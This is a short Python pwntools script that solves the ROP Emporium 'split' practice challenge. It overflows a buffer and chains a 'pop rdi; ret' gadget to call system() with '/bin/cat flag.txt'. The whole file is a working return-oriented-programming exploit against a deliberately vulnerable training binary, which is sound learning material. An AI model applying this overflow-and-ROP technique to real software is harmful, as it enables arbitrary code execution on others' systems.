#!/usr/bin/env python
from pwn import *

s = process('./split')
s.recvuntil('>')

# nm split | grep ' t '
# 0000000000400807 t usefulFunction
target_function_addr = 0x400807
padding = 40

#test: calling function usefulFunction
#payload = 'A'*padding
#payload += p64(0x400807)

elf = ELF('split')
system_plt = elf.plt['system']
print 'system_plt =', hex(system_plt)

bin_cat_flag = next(elf.search('/bin/cat flag.txt'))
print 'bin_cat_flag =', hex(bin_cat_flag)

#0x0000000000400883 : pop rdi ; ret
pop_rdi_ret = 0x400883


payload = 'A'*padding
payload += p64(pop_rdi_ret)
payload += p64(bin_cat_flag)
payload += p64(system_plt)

s.sendline(payload)
s.interactive()







